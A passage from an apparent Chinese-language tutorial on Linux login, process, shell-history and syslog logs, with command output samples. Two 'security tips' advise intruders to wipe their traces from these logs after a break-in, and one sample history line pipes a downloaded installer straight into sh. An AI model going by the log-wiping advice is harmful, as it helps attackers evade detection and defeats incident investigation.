<p><strong><code>ac -d</code> 显示每天总的连接时间：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">➜ ac -d</div><div class="line">Oct 16  total        6.14</div><div class="line">Oct 17  total       40.45</div><div class="line">Oct 20  total        6.11</div><div class="line">Oct 21  total       24.01</div><div class="line">Oct 22  total       30.66</div><div class="line">Dec 10  total        7.08</div><div class="line">Dec 12  total        5.11</div><div class="line">Dec 15  total        7.79</div><div class="line">Dec 16  total       10.32</div><div class="line">Dec 17  total        5.17</div><div class="line">Dec 18  total        9.01</div><div class="line">Dec 19  total        7.75</div><div class="line">Dec 22  total       10.64</div><div class="line">Dec 23  total        6.19</div><div class="line">Dec 24  total       13.99</div><div class="line">Dec 26  total       37.92</div><div class="line">Today   total        3.11</div></pre></td></tr></table></figure></p>
<h3 id="1-7-finger-命令"><a href="#1-7-finger-命令" class="headerlink" title="1.7 finger 命令"></a>1.7 <code>finger</code> 命令</h3><p>该命令输出用户的 <strong>注册名称</strong>、<strong>真实名称</strong>、<strong>终端名</strong>、<strong>写状态</strong>、<strong>停滞时间</strong>、<strong>登录时间</strong>、<strong>办公地点</strong>、<strong>办公电话</strong> 等信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ finger</div><div class="line">Login     Name       Tty      Idle  Login Time   Office     Office Phone   Host</div><div class="line">root      root       tty1     2:25  Dec 29 16:34</div><div class="line">root      root       pts/0          Dec 29 15:48                           (ses-254-254.geology.ohio-state.edu)</div><div class="line">root      root       pts/1      37  Dec 29 16:57                           (ses-254-254.geology.ohio-state.edu)</div></pre></td></tr></table></figure></p>
<h3 id="1-8-uptime-命令"><a href="#1-8-uptime-命令" class="headerlink" title="1.8 uptime 命令"></a>1.8 <code>uptime</code> 命令</h3><p>该命令输出系统至今的运行时间（<code>-p</code> 选项以可读性较好的形式输出）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ uptime</div><div class="line"> 19:05:17 up 3 days,  4:21,  3 users,  load average: 0.00, 0.01, 0.05</div><div class="line">➜ uptime -p</div><div class="line">up 3 days, 4 hours, 21 minutes</div></pre></td></tr></table></figure></p>
<h3 id="1-9-lastlog-命令"><a href="#1-9-lastlog-命令" class="headerlink" title="1.9 lastlog 命令"></a>1.9 <code>lastlog</code> 命令</h3><p><code>/var/log/lastlog</code> 文件在每次有用户登录时被查询。可以使用 <code>lastlog</code> 命令来检查某特定用户上次登录的时间，并格式化输出上次登录日志 <code>/var/log/lastlog</code> 的内容。它根据 <code>UID</code> 排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示 <code>Never logged(从未登录过)</code>。注意需要<strong>以 <code>root</code> 运行该命令</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">➜ lastlog</div><div class="line">用户名           端口     来自             最后登陆时间</div><div class="line">root            pts/1                    一 12月 29 17:00:01 +0800 2014</div><div class="line">bin                                      **从未登录过**</div><div class="line">daemon                                   **从未登录过**</div><div class="line">adm                                      **从未登录过**</div><div class="line">lp                                       **从未登录过**</div><div class="line">sync                                     **从未登录过**</div><div class="line">shutdown                                 **从未登录过**</div><div class="line">halt                                     **从未登录过**</div><div class="line">mail                                     **从未登录过**</div><div class="line">operator                                 **从未登录过**</div><div class="line">games                                    **从未登录过**</div><div class="line">ftp                                      **从未登录过**</div><div class="line">nobody                                   **从未登录过**</div><div class="line">dbus                                     **从未登录过**</div><div class="line">apache                                   **从未登录过**</div><div class="line">polkitd                                  **从未登录过**</div><div class="line">avahi                                    **从未登录过**</div><div class="line">avahi-autoipd                            **从未登录过**</div><div class="line">libstoragemgmt                           **从未登录过**</div><div class="line">abrt                                     **从未登录过**</div><div class="line">tomcat                                   **从未登录过**</div><div class="line">pcp                                      **从未登录过**</div><div class="line">postfix                                  **从未登录过**</div><div class="line">sshd                                     **从未登录过**</div><div class="line">ntp                                      **从未登录过**</div><div class="line">chrony                                   **从未登录过**</div><div class="line">oprofile                                 **从未登录过**</div><div class="line">tcpdump                                  **从未登录过**</div><div class="line">saslauth                                 **从未登录过**</div><div class="line">mysql                                    **从未登录过**</div><div class="line">usbmuxd                                  **从未登录过**</div></pre></td></tr></table></figure></p>
<blockquote>
<p>另外，可一加一些参数，例如:<br><code>last -u 102</code> 将报告 <code>UID</code> 为 <code>102</code> 的用户；<br><code>last -t 7</code> 表示限制上一周的报告。</p>
</blockquote>
<h3 id="1-10-var-log-secure-文件"><a href="#1-10-var-log-secure-文件" class="headerlink" title="1.10 /var/log/secure 文件"></a>1.10 <code>/var/log/secure</code> 文件</h3><p>记录登入系统存取数据的文件，例如 <code>pop3/ssh/telnet/ftp</code> 等都会被记录，我们可以利用此文件找出不安全的登录I该文件可以直接用编辑器打开查看，也可以用Linux中常见的文本处理工具如<code>cat/wc/more/head/tail/awk/sed</code> 等进行分析处理。下面是该文件的部分内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Dec 29 15:48:43 localhost sshd[13053]: Accepted password for root from 140.254.254.254 port 9891 ssh2</div><div class="line">Dec 29 15:48:44 localhost sshd[13053]: pam_unix(sshd:session): session opened for user root by (uid=0)</div><div class="line">Dec 29 16:30:41 localhost unix_chkpwd[15004]: password check failed for user (root)</div><div class="line">Dec 29 16:30:41 localhost login: pam_unix(login:auth): authentication failure; logname=LOGIN uid=0 euid=0 tty=tty1 ruser= rhost=  user=root</div><div class="line">Dec 29 16:30:41 localhost login: pam_succeed_if(login:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</div><div class="line">Dec 29 16:30:43 localhost login: FAILED LOGIN 1 FROM tty1 FOR root, Authentication failure</div><div class="line">Dec 29 16:30:51 localhost unix_chkpwd[15013]: password check failed for user (root)</div><div class="line">Dec 29 16:30:51 localhost login: pam_succeed_if(login:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</div></pre></td></tr></table></figure>
<h3 id="1-11-安全-Tips"><a href="#1-11-安全-Tips" class="headerlink" title="1.11 安全 Tips"></a>1.11 安全 Tips</h3><p>这类日志无论在攻击和防守时都是至关重要的。从防护角度来说，假如系统遭到了黑客入侵，这类日志能辅助排查黑客登录系统相关的信息。从黑客攻击的角度来说，如果成功入侵了一个 Linux 系统的主机，在后渗透环节擦除相关日志时，一定要擦除上面这些日志中自己可能留下的痕迹。</p>
<h2 id="2-进程监控日志"><a href="#2-进程监控日志" class="headerlink" title="2. 进程监控日志"></a>2. 进程监控日志</h2><h3 id="2-1-系统进程监控"><a href="#2-1-系统进程监控" class="headerlink" title="2.1 系统进程监控"></a>2.1 系统进程监控</h3><p>UNIX 可以跟踪每个用户运行的每条命令，如果想知道昨晚弄乱了哪些重要的文件，进程统计子系统可以告诉你。它还对跟踪一个侵入者有帮助。与连接时间日志不同，进程统计子系统缺省不激活，它必须手动启动。在 Linux 系统中启动进程统计使用 <code>accton</code> 命令，必须用 <code>root</code> 身份来运行。<code>accton</code> 命令的形式 <code>accton file</code>，<code>file</code> 必须先存在。先使用 <code>touch</code> 命令来创建 <code>pacct</code> 文件：<code>touch /var/log/pacct</code>，然后运行 <code>accton /var/log/pacct</code> 。一旦 <code>accton</code> 被激活，就可以使用 <code>lastcomm</code> 命令监测系统中任何时候执行的命令。若要关闭统计，可以使用不带任何参数的 <code>accton</code> 命令。</p>
<p><code>lastcomm</code> 命令报告以前执行的文件。不带参数时，<code>lastcomm</code> 命令显示当前统计文件生命周期内纪录的所有命令的有关信息。包括 <strong>命令名</strong>、<strong>用户</strong>、<strong>tty</strong>、<strong>命令花费的CPU时间</strong>和<strong>一个时间戳</strong>。如果系统有许多用户，输入则可能很长：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜ accton /var/account/pacct //开启进程统计日志监控</div><div class="line">➜</div><div class="line">➜ lastcomm -f /var/log/pacct</div><div class="line">zsh               F    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">zsh               F    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">zsh               F    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">➜</div><div class="line">➜ accton off //关闭进程统计日志监控</div></pre></td></tr></table></figure>
<h3 id="2-2-Shell-命令记录"><a href="#2-2-Shell-命令记录" class="headerlink" title="2.2 Shell 命令记录"></a>2.2 Shell 命令记录</h3><h4 id="2-2-1-命令记录文件"><a href="#2-2-1-命令记录文件" class="headerlink" title="2.2.1 命令记录文件"></a>2.2.1 命令记录文件</h4><hr>
<p>现在大部分 Linux/Unix 系统甚至 Mac OSX ，默认 Shell 都是 <code>bash</code>，<code>bash</code> 会在每个用户主目录里生成一个 <code>.bash_history</code> 文件，其中记录着用户用 <code>bash</code> 执行过的 Shell 命令，下面是该文件的部分内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">startx</div><div class="line">ls</div><div class="line">php version</div><div class="line">php --help</div><div class="line">java -c</div><div class="line">java</div><div class="line">ifconfig</div><div class="line">vi /etc/sysconfig/network-scripts/</div><div class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens160</div><div class="line">ls</div><div class="line">ifconfig</div><div class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens160</div><div class="line">vi /etc/sysconfig/grub</div><div class="line">grub2-mkconfig --help</div><div class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</div><div class="line">service network restart</div><div class="line">ifconfig</div><div class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens160</div></pre></td></tr></table></figure></p>
<p>如果系统默认 Shell 不是 <code>bash</code>，假如是 <code>ZSh</code> 呢？ <code>ZSh</code> 会在用户主目录下默认生成一个 <code>zsh</code> 自己的命令历史记录文件 <code>.zsh_history</code> ，这个文件记录着用户用 <code>zsh</code> 运行的 Shell 命令。不同的是， <code>zsh</code> 的命令历史记录文件中还记录了对应命令执行的时间戳，下面是该文件的部分内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">: 1418369144:0;wget -O .zshrc http://git.grml.org/f/grml-etc-core/etc/zsh/zshrc &amp;&amp; source ~/.zshrc</div><div class="line">: 1418369204:0;vim conf/httpd.conf</div><div class="line">: 1418369266:0;la /</div><div class="line">: 1418369314:0;wget http://sourceforge.net/projects/zsh/files/zsh/5.0.7/zsh-5.0.7.tar.bz2/download</div><div class="line">: 1418369735:0;rm -rf .oh-my-zsh</div><div class="line">: 1418369738:0;wget --no-check-certificate http://install.ohmyz.sh -O - | sh</div><div class="line">: 1418369765:0;zsh</div><div class="line">: 1418369788:0;vim .zshrc</div><div class="line">: 1418369931:0;cd /etc/</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h4 id="2-2-2-history-命令"><a href="#2-2-2-history-命令" class="headerlink" title="2.2.2 history 命令"></a>2.2.2 <code>history</code> 命令</h4><hr>
<p>其实，Linux中有一个命令叫做 <code>history</code> ，它会列出 <strong>系统默认Shell</strong> 最近执行的1000条命令，并给日志文件中的每条命令进行编号。</p>
<p>如果系统 <strong>默认 Shell</strong> 是 <code>bash</code> ，该命令会读取当前用户主目录下的 <code>.bash_history</code> 文件中的内容；虽然 <code>man history</code> 显示该命令其实是 <code>bash</code> 的一个内置命令模块，但如果系统 <strong>默认 Shell</strong> 是 <code>zsh</code> ，该命令则会读取 <code>.zsh_history</code> 文件，并且不会显示该文件中的时间戳信息。下面是该命令的部分输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">➜ history| more</div><div class="line">1  wget -O .zshrc http://git.grml.org/f/grml-etc-core/etc/zsh/zshrc &amp;&amp; source ~/.zshrc</div><div class="line">2  vim conf/httpd.conf</div><div class="line">3  la /</div><div class="line">4  wget http://sourceforge.net/projects/zsh/files/zsh/5.0.7/zsh-5.0.7.tar.bz2/download</div><div class="line">5  rm -rf .oh-my-zsh</div><div class="line">6  wget --no-check-certificate http://install.ohmyz.sh -O - | sh</div><div class="line">7  zsh</div><div class="line">8  vim .zshrc</div><div class="line">9  cd /etc/</div><div class="line">10  cd</div><div class="line">11  cd .oh-my-zsh</div><div class="line">12  vim themes/robbyrussell.zsh-theme</div><div class="line">13  cd themes</div><div class="line">14  cp robbyrussell.zsh-theme robbyrussell.zsh-theme_bak</div><div class="line">15  ls</div><div class="line">16  vim robbyrussell.zsh-theme</div><div class="line">17  scp --h</div><div class="line">18  scp root@.140.0.105.2:/root/.oh-my-zsh/themes/robbyrussell.zsh-theme ./robby.bak</div><div class="line">19  scp root@140.0.105.2:/root/.oh-my-zsh/themes/robbyrussell.zsh-theme ./robby.bak</div><div class="line">20  vim robby.bak</div><div class="line">21  vim robbyrussell.zsh-theme</div><div class="line">22  cd</div><div class="line">23  source .zshrc</div><div class="line">24  ls</div><div class="line">25  cd .oh-my-zsh</div><div class="line">26  cd themes</div><div class="line">27  rm robby.bak robbyrussell.zsh-theme_bak</div><div class="line">28  ps aux | grep firewall</div></pre></td></tr></table></figure></p>
<p><code>history</code> 命令还有些 <em>小巧</em> 的用法。它对日志文件中的命令进行了编号，利用这些编号可以方便地执行某些命令，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ !31   //执行第31条命令</div><div class="line">➜ !!    //执行上一条命令</div></pre></td></tr></table></figure></p>
<h4 id="2-2-3-安全-Tips"><a href="#2-2-3-安全-Tips" class="headerlink" title="2.2.3 安全 Tips"></a>2.2.3 安全 Tips</h4><p>Shell 命令记录日志，包含了大量的敏感操作记录（看上面的示例就能发现）。从防护的角度来说，如果Linux系统主机被入侵，这些日志文件会记录下黑客登录主机后进行的操作（如果日志没被抹去的话）。从攻击的角度来说，一是这些日志能给黑客提供大量的敏感信息，方便黑客进行快速渗透；二是黑客所有的操作命令也会被记录到日志中，后渗透攻击阶段要记得抹除这些攻击日志。</p>
<h2 id="3-系统日志（syslog-rsyslog）"><a href="#3-系统日志（syslog-rsyslog）" class="headerlink" title="3. 系统日志（syslog/rsyslog）"></a>3. 系统日志（syslog/rsyslog）</h2><p><code>syslog</code> 是一个历史悠久的日志系统，几乎所有的UNIX和Linux操作系统都是采用 <code>syslog</code> 进行系统日志的管理和配置。Linux 系统内核和许多程序会产生各种错误信息、警告信息和其他的提示信息。这些信息对管理员了解系统的运行状态是非常有用的，所以应该把它们写到日志文件中去。而执行这个过程的程序就是 <code>syslog</code> 。<code>syslog</code> 可以根据信息的来源以及信息的重要程度将信息保存到不同的日志文件中，例如，为了方便查阅，可以把内核信息与其他信息分开，单独保存到一个独立的日志文件中。在默认的 <code>syslog</code> 配置下，日志文件通常都保存在 <code>/var/log</code> 目录下。<code>syslog</code> 的守护进程为 <code>syslogd</code> ，系统启动时，默认会自动运行 <code>syslogd</code> 守护进程。</p>
<p><code>syslog</code> 已被许多日志函数采纳，它用在许多保护措施中。任何程序都可以通过 <code>syslog</code> 记录事件。<code>syslog</code> 可以记录系统事件，可以写到一个文件或设备中，或给用户发送一个信息。它能记录本地事件或通过网络记录另一个主机上的事件。</p>
<p><code>syslog</code> 设备依据两个重要的文件：<code>/etc/syslogd（守护进程）</code> 和 <code>/etc/syslog.conf</code> 配置文件。习惯上，多数 <code>syslog</code> 信息被写到 <code>/var/adm</code> 或 <code>/var/log</code> 目录下的信息文件中。一个典型的 <code>syslog</code> 记录包括生成程序的名字和一个文本信息。它还包括一个设备和一个优先级范围（但不在日志中出现）。</p>
<p>Linux 系统日志配置机器存放位置大致如下图所示：<br><img src="http://img.blog.csdn.net/20130919161257234?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2hhb2ZhbndlaQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
<p>而现在，<code>syslog</code> 有了一个多线程升级版：<code>rsyslog</code>，它比 <code>syslog</code> 功能更强大也更高效，<code>CentOS7</code> 默认的系统日志服务就是<code>rsyslog</code>。它的基础功能与 <code>syslog</code> 一样，配置的方法与里面的概念也无二致，不同的是，其配置文件变成了 <code>/etc/rsyslog.conf</code>。<strong>本小节依然以 <code>syslog</code> 为例讲解</strong>。</p>
<h3 id="3-1-syslog-配置"><a href="#3-1-syslog-配置" class="headerlink" title="3.1 syslog 配置"></a>3.1 syslog 配置</h3><p><code>/etc/syslog.conf</code> 根据如下的格式定义规则：<code>facility.level action</code> ，即<br><code>设备.优先级 动作</code> 。<code>facility.level</code> 字段也被称为 <code>seletor</code>（选择条件），<strong>选择条件</strong> 和 <strong>动作</strong> 之间用空格或 <code>tab</code> 分割开；<code>facility</code> 可以理解成日志对应的类型；<code>action</code> 可以理解为日志的处理方式。</p>
<h4 id="3-1-1-facility"><a href="#3-1-1-facility" class="headerlink" title="3.1.1 facility"></a>3.1.1 facility</h4><p><code>facility</code> 定义日志消息的<strong>范围</strong> 或 <strong>种类</strong>，其可使用的 <code>key</code>有一下几种：</p>
<blockquote>
<ul>
<li><strong>auth</strong> ——  由 <code>pam_pwdb</code> 报告的认证活动，记录认证系统 <code>login</code>、<code>su</code>、<code>getty</code> 等的活动信息；</li>
<li><strong>authpriv</strong> —— 包括特权信息如用户名在内的认证活动，只登录到所选择的单个用户可读的文件中；</li>
<li><strong>cron</strong> － 与 <code>cron</code> 和 <code>at</code> 有关的计划任务信息；</li>
<li><strong>daemon</strong> －与 <code>inetd</code> 守护进程有关的后台进程信息；</li>
<li><strong>kern</strong> － 内核信息，首先通过 <code>klogd</code> 传递；</li>
<li><strong>lpr</strong> － 与打印服务有关的信息；</li>
<li><strong>mail</strong> － 与电子邮件有关的信息；</li>
<li><strong>mark</strong> － <code>syslog</code> 内部功能用于生成时间戳；</li>
<li><strong>news</strong> － 来自新闻服务器的信息；</li>
<li><strong>syslog</strong> － 由 <code>syslog</code> 生成的信息；</li>
<li><strong>user</strong> － 由用户程序生成的信息；</li>
<li><strong>uucp</strong> －由 <strong>uucp</strong> 生成的信息；</li>
<li><strong>local0~local7</strong> －与自定义程序使用。</li>
</ul>
</blockquote>
<p><code>*</code> 通配符代表除了 <code>mark</code> 以外的所有功能。除 <code>mark</code> 为内部使用外，还有 <code>security</code> 为一个旧的 <code>key</code> 定义，等同于 <code>auth</code> ，已经不再建议使用。</p>
<h4 id="3-1-2-level"><a href="#3-1-2-level" class="headerlink" title="3.1.2 level"></a>3.1.2 level</h4><p><code>level</code> 定义消息的紧急程度，共有8个级别。按严重程度由高到低顺序排列为：</p>
<blockquote>
<ul>
<li><strong>emerg</strong> － 该系统不可用，等同 <strong><code>panic</code></strong>；</li>
<li><strong>alert</strong> － 需要立即被修改的条件；</li>
<li><strong>crit</strong> － 阻止某些工具或子系统功能实现的错误条件；</li>
<li><strong>err</strong> － 阻止工具或某些子系统部分功能实现的错误条件，等同 <strong>error</strong>；</li>
<li><strong>warning</strong> － 预警信息，等同 <strong>warn</strong>；</li>
<li><strong>notice</strong> － 具有重要性的普通条件；</li>
<li><strong>info</strong> －提供信息的消息；</li>
<li><strong>debug</strong> － 不包含函数条件或问题的其他信息；</li>
<li><strong>none</strong> － 没有重要级，通常用于排错。</li>
</ul>
</blockquote>
<p>通配符 <code>*</code> 表示所有级别，除了 <strong>none</strong> 。其中 <code>panic</code> 、 <code>error</code> 、 <code>warn</code> 均为旧的标识符，不再建议使用。</p>
<p>在定义 <code>level</code> 级别的时候，需要注意两点： </p>
<ol>
<li>优先级是由应用程序在编程的时候已经决定的，除非修改源码再编译，否则不能改变消息的优先级；</li>
<li>低的优先级包含高优先级，例如，为某个应用程序定义 <code>info</code> 的日志导向，则涵盖 <code>notice</code> 、 <code>warning</code> 、 <code>err</code> 、 <code>crit</code> 、 <code>alert</code> 、 <code>emerg</code> 等消息。（除非使用 <code>=</code> 号定义）</li>
</ol>
<h4 id="3-1-3-selector"><a href="#3-1-3-selector" class="headerlink" title="3.1.3 selector"></a>3.1.3 selector</h4><p>通过点号 <code>.</code> 把 <code>facility</code> 和 <code>level</code> 连接在一起则成为 <code>selector（选择条件）</code>。可以使用分号 <code>;</code> 同时定义多个选择条件。也支持三个修饰符：</p>
<blockquote>
<p><strong><code>*</code></strong> － 所有日志信息；<br><strong><code>=</code></strong> － 等于，即仅包含本优先级的日志信息；<br><strong><code>!</code></strong> － 不等于，本优先级日志信息除外；</p>
</blockquote>
<h4 id="3-1-4-action"><a href="#3-1-4-action" class="headerlink" title="3.1.4 action"></a>3.1.4 action</h4><p>由前面选择条件定义的日志信息，可执行下面的动作：</p>
<blockquote>
<p><strong>file</strong> － 指定日志文件的绝对路径；<br><strong>terminal</strong> 或 <strong>print</strong> － 发送到串行或并行设备标志符，例如 <code>/dev/ttyS2</code> ；<br><strong>@host</strong> － 远程的日志服务器；<br><strong>username</strong> － 发送信息到本机的指定用户信息窗口中，但该用户必须已经登录到系统中；<br><strong>named pipe</strong> － 发送到预先使用 <code>mkfifo</code> 命令来创建的 <code>FIFO</code> 文件的绝对路径※注意，不能通过 <code>|/var/xxx.sh</code> 方式导向日志到其他脚本中处理。</p>
</blockquote>
<h4 id="3-1-5-配置举例"><a href="#3-1-5-配置举例" class="headerlink" title="3.1.5 配置举例"></a>3.1.5 配置举例</h4><p>上面详细讲解了 <code>syslog</code> 配置文件 <code>/etc/syslog.conf</code> 里核心的配置方法，下面举几个例子说明一下配置项及其意义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#把除 邮件、新闻、授权信息、计划任务信息等意外的所有 `info` 类消息都存入 /var/log/messages 文件</div><div class="line">*.info;mail.none;news.none;authpriv.none;cron.none /var/log/messages</div><div class="line"></div><div class="line">#把邮件、新闻组中仅 info 消息写入info文件，其他信息不写入</div><div class="line">mail,news.=info /var/adm/info</div><div class="line"></div><div class="line">#把邮件除 info 消息的所有消息存入 mail 文件</div><div class="line">mail.*;mail.!=info /var/adm/mail</div><div class="line"></div><div class="line">#仅把邮件的通知性消息发送到t ty12 终端设备</div><div class="line">mail.=info /dev/tty12</div><div class="line"></div><div class="line">#如果 root 和 jiayu 用户已经登录到系统，则把所有紧急信息通知他们</div><div class="line">*.alert root,joey</div><div class="line"></div><div class="line">#把所有信息都导向到 jiayu 主机（通过 /etc/hosts 或 dns 解析其IP地址）※注意：每条消息均会经过所有规则的，并不是唯一匹配的。</div><div class="line">*.* @jiayu</div></pre></td></tr></table></figure>
<p>也就是说，假设 <code>mail.=info</code> 信息通过上面范例中定义的规则时，<code>/var/adm/info</code>、<code>/var/adm/mail</code>、<code>/dev/tty12</code>，甚至 <strong>jiayu</strong> 主机都会收到相同的信息。这样看上去比较烦琐，但可以带来的好处就是保证了信息的完整性，可供不同地方进行分析。</p>
<h3 id="3-2-messages-日志"><a href="#3-2-messages-日志" class="headerlink" title="3.2 messages 日志"></a>3.2 messages 日志</h3><p><code>/var/log/messages</code>，是核心系统日志文件。它包含了系统启动时的引导信息，以及系统运行时的其他状态消息，比如 <code>mail</code> ， <code>cron</code> ， <code>daemon</code> <code>，kern</code> 和 <code>auth</code> ，甚至 <code>iptables</code> 和 <code>SELinux</code> 和 <code>DHCP</code> 服务日志，这也是它被称为杂货铺的原因。通常，该文件时在做故障诊断时首先要查看的文件，大家一般都喜欢用以下命令看最后十条日志：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tail -n10 /var/log/messages</div></pre></td></tr></table></figure></p>
<p>该文件以用户易懂的格式明文保存文件，可以用常见的 Linux 文件处理命令来分析处理其中的日志内容。</p>
<h3 id="3-3-dmesg"><a href="#3-3-dmesg" class="headerlink" title="3.3 dmesg"></a>3.3 dmesg</h3><p><code>dmesg</code> 提供了一个简单的方法查看系统启动信息。当 Linux 启动的时候，内核的信息被存入内核 <code>ring</code> 缓存和日志文件 <code>/var/log/dmesg</code> 当中，<code>dmesg</code> 可以显示缓存中的内容。默认情况下，<code>dmesg</code> 打印内容到屏幕上面，当然你可以重定向输出到一个文件。如果硬件损坏的话，在 <code>dmesg</code> 日志里是有显示的，可用以下命令来查看 <code>dmesg | grep error</code> 。</p>
<p>正常状态下，也可以用 <code>dmesg</code> 命令查看最后一次系统引导的日志，下面是部分输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">➜ dmesg| more</div><div class="line">[    0.000000] Initializing cgroup subsys cpuset</div><div class="line">[    0.000000] Initializing cgroup subsys cpu</div><div class="line">[    0.000000] Initializing cgroup subsys cpuacct</div><div class="line">[    0.000000] Linux version 3.10.0-123.13.2.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) ) #1 SMP Thu Dec 18 14:09:13 UTC 2014</div><div class="line">[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-3.10.0-123.13.2.el7.x86_64 root=/dev/mapper/centos-root ro rd.lvm.lv=centos/swap vconsole.font=latarcyrheb-sun16 net.ifnames=0 biosdevname=0</div><div class="line"> rd.lvm.lv=centos/root crashkernel=auto vconsole.keymap=us rhgb quiet LANG=zh_CN.UTF-8</div><div class="line">[    0.000000] Disabled fast string operations</div><div class="line">[    0.000000] e820: BIOS-provided physical RAM map:</div><div class="line">[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009f7ff] usable</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000000009f800-0x000000000009ffff] reserved</div><div class="line">[    0.000000] BIOS-e820: [mem 0x00000000000ca000-0x00000000000cbfff] reserved</div><div class="line">[    0.000000] BIOS-e820: [mem 0x00000000000dc000-0x00000000000fffff] reserved</div><div class="line">[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003feeffff] usable</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000003fef0000-0x000000003fefefff] ACPI data</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000003feff000-0x000000003fefffff] ACPI 